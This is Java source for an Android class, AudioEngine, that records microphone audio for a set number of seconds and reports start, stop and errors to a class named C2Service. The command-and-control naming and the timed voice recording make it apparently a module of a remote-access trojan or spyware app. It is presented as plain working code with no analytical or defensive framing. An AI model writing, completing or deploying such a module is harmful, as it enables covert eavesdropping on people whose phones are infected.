package com.wuzenx.engine;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;

import com.wuzenx.C2Service;

import java.io.File;

public class AudioEngine {
    private Context context;
    private MediaRecorder recorder = null;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean recording = false;

    public AudioEngine(Context context) {
        this.context = context;
    }

    public void startRecording(int durationSeconds) {
        if (recording) {
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log", "Already recording");
            return;
        }

        try {
            File audioDir = new File(
                Environment.getExternalStorageDirectory(),
                "Music/WuzenX");
            audioDir.mkdirs();
            File audioFile = new File(audioDir,
                "recording_" + System.currentTimeMillis() + ".3gp");

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            recording = true;

            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log",
                    "Recording started (" + durationSeconds + "s)");

            // Stop after duration
            handler.postDelayed(this::stopRecording, durationSeconds * 1000L);

        } catch (Exception e) {
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log",
                    "Recording error: " + e.getMessage());
        }
    }

    public void stopRecording() {
        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;
            }
        } catch (Exception ignored) {}
        recording = false;

        if (C2Service.instance != null)
            C2Service.instance.sendMessage("log", "Recording stopped");
    }
}
